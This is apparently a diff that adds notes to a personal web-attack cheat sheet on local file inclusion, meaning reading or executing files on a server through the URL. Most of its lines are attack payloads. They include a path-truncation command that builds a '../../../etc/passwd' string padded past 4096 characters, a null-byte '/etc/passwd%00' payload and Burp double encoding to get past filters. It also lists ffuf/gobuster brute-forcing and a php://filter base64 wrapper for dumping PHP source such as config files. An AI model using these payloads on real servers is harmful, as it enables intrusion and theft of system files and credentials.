@@ -3,3 +3,22 @@ Read / Execute files on server by url
 Burp double encoder:
   encode 2 times to pybass
 
+If path specified, start from specified path
+
+check .php included:
+  put NO .php in url
+cut .php over 4096 at the end:
+  echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+  OR
+  /etc/passwd%00
+
+
+Fuff / Gobuster:
+  brute .php
+
+
+Read php raw code：
+  php://filter/read=convert.base64-encode/resource=config      in url
+
+
+  
